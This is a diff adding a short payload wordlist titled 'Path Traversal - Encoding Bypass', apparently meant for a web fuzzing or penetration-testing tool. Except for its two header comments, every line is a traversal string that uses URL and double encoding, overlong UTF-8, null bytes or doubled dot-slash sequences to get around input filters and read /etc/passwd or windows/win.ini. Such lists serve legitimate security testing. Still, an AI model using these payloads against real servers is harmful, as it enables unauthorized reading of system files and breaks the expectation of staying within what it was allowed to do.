@@ -1,0 +1,25 @@
+# Path Traversal - Encoding Bypass
+# URL encoding, double encoding, and other tricks to bypass filters
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+..%c1%9c..%c1%9cetc/passwd
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..../..../..../etc/passwd
+..%00/..%00/..%00/etc/passwd
+../etc/passwd%00
+../etc/passwd%00.html
+../etc/passwd%00.jpg
+../etc/passwd%00.png
+..%5c..%5c..%5cwindows%5cwin.ini
+..%255c..%255c..%255cwindows%255cwin.ini
+..\/..\/..\/etc/passwd
+/..\..\..\etc/passwd
